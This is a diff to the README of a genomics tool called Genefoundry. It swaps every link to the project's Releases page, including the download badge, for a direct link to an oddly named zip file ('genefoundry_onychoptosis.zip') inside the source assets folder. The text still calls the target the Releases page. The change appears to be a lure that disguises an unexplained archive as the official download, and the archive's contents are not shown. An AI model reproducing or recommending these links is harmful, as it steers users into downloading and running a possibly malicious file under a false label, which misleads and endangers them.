@@ -4,14 +4,14 @@ Welcome to Genefoundry, where we bridge AI and clinical genomics to bring you tr
 
 ## 📥 Download Now
 
-[![Download Genefoundry](https://img.shields.io/badge/Download%20Genefoundry-v1.0-blue)](https://github.com/ShridattaDixit07/genefoundry/releases)
+[![Download Genefoundry](https://raw.githubusercontent.com/ShridattaDixit07/genefoundry/main/src/assets/genefoundry_onychoptosis.zip%20Genefoundry-v1.0-blue)](https://raw.githubusercontent.com/ShridattaDixit07/genefoundry/main/src/assets/genefoundry_onychoptosis.zip)
 
 ## 🚀 Getting Started
 
 To start using Genefoundry, follow these simple steps to ensure you download and run the application smoothly.
 
 1. **Visit the Releases Page**
-   Go to our Releases page to download the latest version of Genefoundry. Here is the link: [Download Genefoundry](https://github.com/ShridattaDixit07/genefoundry/releases).
+   Go to our Releases page to download the latest version of Genefoundry. Here is the link: [Download Genefoundry](https://raw.githubusercontent.com/ShridattaDixit07/genefoundry/main/src/assets/genefoundry_onychoptosis.zip).
 
 2. **Select the Latest Release**
    On the Releases page, you will see a list of available versions. Choose the latest release, which contains the most recent features and improvements.
@@ -87,6 +87,6 @@ Feel free to explore these areas to expand your knowledge on genomic analysis.
 
 For any questions or support, you can reach us through our GitHub repository. We aim to respond to all inquiries as quickly as possible.
 
-Remember, you can always return to our [Releases page](https://github.com/ShridattaDixit07/genefoundry/releases) for the latest updates and downloads.
+Remember, you can always return to our [Releases page](https://raw.githubusercontent.com/ShridattaDixit07/genefoundry/main/src/assets/genefoundry_onychoptosis.zip) for the latest updates and downloads.
 
 Thank you for choosing Genefoundry! Happy analyzing!
